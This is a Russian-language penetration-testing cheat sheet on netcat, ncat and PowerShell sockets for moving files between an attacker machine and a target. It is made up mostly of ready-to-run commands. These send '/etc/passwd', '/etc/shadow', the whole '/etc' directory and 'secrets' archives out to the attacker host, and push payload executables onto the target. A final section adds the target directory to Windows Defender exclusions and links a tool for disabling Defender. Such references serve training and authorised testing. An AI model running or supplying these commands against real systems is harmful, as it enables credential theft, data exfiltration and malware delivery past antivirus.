# 07 - Netcat

> [← README](../../README_RU.md) · [Следующий раздел →](08-rdp-winrm.md)

Базовый транспорт: работает по любому одному открытому TCP-порту, когда нет ни wget/curl, ни возможности поднять полноценный сервер.

> `LHOST` - наш ПК (атакующий), `RHOST` - цель. В каждом блоке шапка **`# LHOST SHELL`** или **`# RHOST SHELL`** говорит, в какой консоли выполнять команду. Не перепутай - это половина всех ошибок новичков.
>
> **Вынесено в другие файлы:** SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), HTTP-загрузка - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md), кодирование - [10](10-encoding.md).

---

## Навигация

|  |  |
|---|---|
| [Две оси: кто слушает и куда течёт файл](#две-оси-кто-слушает-и-куда-течёт-файл) | [Флаг закрытия соединения: `-q 0` / `-N`](#флаг-закрытия-соединения--q-0---n) |
| [1.🐧Linux](#1linux) | [2.🪟Windows](#2windows) |
| [3. ncat](#3-ncat) | [4. Диагностика](#4-диагностика) |
| [5. Обход Windows Defender (для nc.exe)](#5обход-windows-defender-для-ncexe) |  |

---

## Две оси: кто слушает и куда течёт файл

Netcat-передачу описывают **два независимых вопроса**, и их постоянно путают.

**Ось 1 - КТО СЛУШАЕТ (направление соединения):**

| Режим | Кто слушает (`-l`) | Кто подключается | Когда |
|-------|--------------------|------------------|-------|
| **REVERSE** | **LHOST** (мы) | RHOST (цель) | По умолчанию. Цель сама «дозванивается» до нас - обходит файрвол, режущий входящие к цели. |
| **BIND** | **RHOST** (цель) | LHOST (мы) | Когда до цели достучаться можем, а она до нас - нет. |

**Ось 2 - КУДА ТЕЧЁТ ФАЙЛ (направление данных):** задаётся редиректом, а не тем, кто слушает.

| Редирект | Что делает сторона |
|----------|--------------------|
| `< file` | **ОТПРАВЛЯЕТ** (читает файл в сокет) |
| `> file` | **ПРИНИМАЕТ** (пишет из сокета в файл) |

**Важно:** кто слушает и кто отправляет - **не связано**. Слушающая сторона может как отдавать (`<`), так и принимать (`>`). Отсюда 4 комбинации (REVERSE/BIND × скачать/вытащить) в каждой ОС ниже.

---

## Флаг закрытия соединения: `-q 0` / `-N`

По умолчанию `nc` после конца данных (EOF) держит соединение открытым - приёмник не понимает, что файл закончился, и **висит** (особенно с `tar` и пайпами: файл получается неполным). Флаг это чинит.

**GNU / traditional netcat и ncat - закрыться сразу после EOF:**
```bash
-q 0
```

**OpenBSD-netcat (свежие Debian/Ubuntu/Kali) - закрыть сокет на EOF:**
```bash
-N
```

> Не знаем, какой `nc` - пробуем сначала `-q 0`; если ругается на флаг - ставим `-N`. В командах ниже стоит `-q 0`, при необходимости заменяем.

| Вариант `nc` | Закрытие | Где встречается |
|--------------|----------|-----------------|
| traditional / GNU | `-q 0` | пакет `netcat-traditional` |
| OpenBSD | `-N` | пакет `netcat-openbsd` (Kali) |
| ncat (nmap) | `-q 0` | пакет `nmap` / `ncat` |

---

## 1.🐧Linux

### Скачать файл НА цель (LHOST → RHOST)

#### REVERSE

**LHOST SHELL - слушаем и ОТДАЁМ файл:**
```bash
nc -lvnp 4444 -q 0 < /tmp/payload.sh
```

**RHOST SHELL - подключаемся и ПРИНИМАЕМ:**
```bash
nc -q 0 $LHOST 4444 > /tmp/payload.sh
```

#### BIND

**RHOST SHELL - цель слушает и ПРИНИМАЕТ:**
```bash
nc -lvnp 4444 -q 0 > /tmp/payload.sh
```

**LHOST SHELL - подключаемся к цели и ОТДАЁМ:**
```bash
nc -q 0 $RHOST 4444 < /tmp/payload.sh
```

### Вытащить файл С цели / эксфильтрация (RHOST → LHOST)

#### REVERSE

**LHOST SHELL - слушаем и ПРИНИМАЕМ:**
```bash
nc -lvnp 4444 -q 0 > loot.tar
```

**RHOST SHELL - подключаемся и ОТДАЁМ файл:**
```bash
nc -q 0 $LHOST 4444 < /etc/passwd
```

**RHOST SHELL - то же через пайп:**
```bash
cat /etc/passwd | nc -q 0 $LHOST 4444
```

#### BIND

**RHOST SHELL - цель слушает и ОТДАЁТ файл:**
```bash
nc -lvnp 4444 -q 0 < /etc/passwd
```

**LHOST SHELL - подключаемся и ПРИНИМАЕМ:**
```bash
nc -q 0 $RHOST 4444 > loot.tar
```

### Передача целой директории (tar | nc)

Пакуем каталог в tar-поток и льём одним соединением - на диск промежуточное не пишется. `-q 0` / `-N` тут обязателен, иначе tar не закроется.

**LHOST SHELL - пакуем каталог `cats-pack` и отдаём (REVERSE, на цель):**
```bash
tar czf - cats-pack | nc -lvnp 4444 -q 0
```

**RHOST SHELL - принимаем и распаковываем в текущую папку:**
```bash
nc -q 0 $LHOST 4444 | tar xzf -
```

**LHOST SHELL - принимаем и распаковываем (REVERSE, с цели):**
```bash
nc -lvnp 4444 -q 0 | tar xzf -
```

**RHOST SHELL - пакуем каталог `/etc` и отдаём:**
```bash
tar czf - /etc | nc -q 0 $LHOST 4444
```

**С `pv` - видно прогресс и скорость (если установлен):**
```bash
tar czf - /etc | pv | nc -q 0 $LHOST 4444
```

### base64-канал через netcat

Для капризных каналов - гоняем файл как текст (REVERSE, эксфильтрация).

**LHOST SHELL - принимаем base64:**
```bash
nc -lvnp 4444 -q 0 > loot.b64
```

**RHOST SHELL - кодируем файл в base64 и шлём:**
```bash
base64 -w0 /etc/shadow | nc -q 0 $LHOST 4444
```

**LHOST SHELL - декод:**
```bash
base64 -d loot.b64 > loot
```

Подробнее - [10 - Encoding](10-encoding.md).

---

## 2.🪟Windows

На Windows нет родного `nc`. Для команд с `nc.exe` ниже нужен сам бинарь на цели: в Kali он лежит в `/usr/share/windows-resources/binaries/` (палится AV - закидываем на цель методами из [01](01-attacker-to-target.md)). Если закинуть `nc.exe` нельзя - сразу к разделу «Нет nc → PowerShell».

### Скачать файл НА цель (LHOST → RHOST)

#### REVERSE

**LHOST SHELL - слушаем и ОТДАЁМ файл:**
```bash
nc -lvnp 4444 -q 0 < payload.exe
```

**RHOST SHELL (CMD) - подключаемся и ПРИНИМАЕМ:**
```cmd
nc.exe -q 0 %LHOST% 4444 > payload.exe
```

#### BIND

**RHOST SHELL (CMD) - цель слушает и ПРИНИМАЕТ:**
```cmd
nc.exe -lvnp 4444 > payload.exe
```

**LHOST SHELL - подключаемся к цели и ОТДАЁМ:**
```bash
nc -q 0 $RHOST 4444 < payload.exe
```

### Вытащить файл С цели / эксфильтрация (RHOST → LHOST)

#### REVERSE

**LHOST SHELL - слушаем и ПРИНИМАЕМ:**
```bash
nc -lvnp 4444 -q 0 > secrets.zip
```

**RHOST SHELL (CMD) - подключаемся и ОТДАЁМ файл:**
```cmd
nc.exe -q 0 %LHOST% 4444 < C:\Users\Public\secrets.zip
```

#### BIND

**RHOST SHELL (CMD) - цель слушает и ОТДАЁТ файл:**
```cmd
nc.exe -lvnp 4444 < C:\Users\Public\secrets.zip
```

**LHOST SHELL - подключаемся и ПРИНИМАЕМ:**
```bash
nc -q 0 $RHOST 4444 > secrets.zip
```

### Нет nc → PowerShell TCP-клиент

Когда `nc.exe` закинуть нельзя.

#### REVERSE - эксфильтрация (цель подключается и шлёт файл)

**LHOST SHELL - принимаем:**
```bash
nc -nlvp 4445 > received_file.zip
```

**RHOST SHELL (PowerShell) - читаем файл и пишем его в сокет:**
```powershell
$bytes = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$socket = New-Object Net.Sockets.TcpClient("$LHOST", 4445)
$stream = $socket.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$socket.Close()
```

**RHOST SHELL (CMD one-liner) - то же одной строкой:**
```cmd
powershell -c "$b=[IO.File]::ReadAllBytes('C:\Users\Public\secrets.zip');$s=New-Object Net.Sockets.TcpClient('%LHOST%',4445);$t=$s.GetStream();$t.Write($b,0,$b.Length);$s.Close()"
```

#### REVERSE - скачать на цель (цель принимает файл)

**LHOST SHELL - отдаём файл:**
```bash
nc -lvnp 4445 -q 0 < payload.exe
```

**RHOST SHELL (PowerShell) - принимаем поток и пишем в файл:**
```powershell
$c = New-Object Net.Sockets.TcpClient("$LHOST", 4445)
$s = $c.GetStream()
$ms = New-Object IO.MemoryStream
$buf = New-Object byte[] 8192
while (($n = $s.Read($buf, 0, $buf.Length)) -gt 0) { $ms.Write($buf, 0, $n) }
[IO.File]::WriteAllBytes("C:\Users\Public\payload.exe", $ms.ToArray())
$c.Close()
```

#### BIND - цель слушает, мы подключаемся

**RHOST SHELL (PowerShell) - слушаем и отдаём файл:**
```powershell
$l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 4444)
$l.Start()
$c = $l.AcceptTcpClient()
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$s.Write($b, 0, $b.Length); $s.Close(); $c.Close(); $l.Stop()
```

**LHOST SHELL - подключаемся и принимаем:**
```bash
nc -q 0 $RHOST 4444 > secrets.zip
```

### base64-канал через netcat

REVERSE, эксфильтрация.

**LHOST SHELL - принимаем base64:**
```bash
nc -lvnp 4444 -q 0 > received_b64.txt
```

**RHOST SHELL (PowerShell) - кодируем файл в base64 и шлём в сокет:**
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"))
$c = New-Object Net.Sockets.TcpClient("$LHOST", 4444)
$w = New-Object IO.StreamWriter($c.GetStream())
$w.Write($b64); $w.Flush(); $c.Close()
```

**LHOST SHELL - декод:**
```bash
base64 -d received_b64.txt > file
```

Подробнее - [10 - Encoding](10-encoding.md).

---

## 3. ncat

Современная переработка netcat (из nmap): SSL, IPv6, SOCKS/HTTP-прокси, брокеринг. https://nmap.org/ncat/

**Установка:**
```bash
sudo apt install -y ncat
```

**Обычная передача (как nc):**
```bash
ncat -lvnp 4444 > secrets.zip
```

**С TLS (`--ssl`) - шифрованный канал без лишних телодвижений:**
```bash
ncat --ssl -lvnp 4444 > secrets.zip
```

**Клиент с TLS:**
```bash
ncat --ssl $LHOST 4444 < secrets.zip
```

**Разрешить только один IP (ACL):**
```bash
ncat -lvnp 4444 --allow $RHOST > secrets.zip
```

**Отдать файл по SSL:**
```bash
ncat --ssl -lvnp 4444 --send-only < payload.exe
```

---

## 4. Диагностика

**Какой вариант nc и какие флаги:**
```bash
nc -h 2>&1 | head -20
```

**Версия ncat:**
```bash
ncat --version
```

**Порт реально слушается на LHOST:**
```bash
ss -tlnp | grep 4444
```

**Проверить доступность порта (ncat):**
```bash
ncat -zv $RHOST 4444
```

> **Частые грабли:**
>
> - **Забыл `-q 0` / `-N`** → приёмник «висит», файл обрезан (особенно `tar`/пайпы). Это причина №1 неполных файлов.
> - **`-l` без `-p` (или наоборот).** Traditional/GNU: `nc -lvnp 4444`. OpenBSD: тоже работает, но можно `nc -l 4444`. Если флаг не принимается - проверяем вариант (`nc -h`).
> - **Файрвол цели** блокирует входящий порт в BIND-режиме → используем REVERSE (цель сама звонит нам).
> - **AV палит `nc.exe`** → PowerShell-вариант или исключение в Defender (ниже).
> - **Нет `nc.exe` на Windows** → PowerShell `TcpClient`/`TcpListener` (раздел 2).
> - **`nc -e` вырезан** во многих сборках - для шеллов это не наш путь, но помним, что для файлов он и не нужен.
> - **Не забываем про хэш** после передачи (см. [01](01-attacker-to-target.md#4-проверка-целостности)).

---

## 5.🪟Обход Windows Defender (для nc.exe)

**RHOST SHELL - добавить текущую директорию в исключения Defender (нужны права):**
```powershell
Add-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction Stop
```

> Это меняет настройки Defender. Используйте только на авторизованном одноразовом лабораторном хосте и удаляйте исключение после теста командой `Remove-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction SilentlyContinue`.

Ещё вариант отключения: https://github.com/es3n1n/defendnot

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
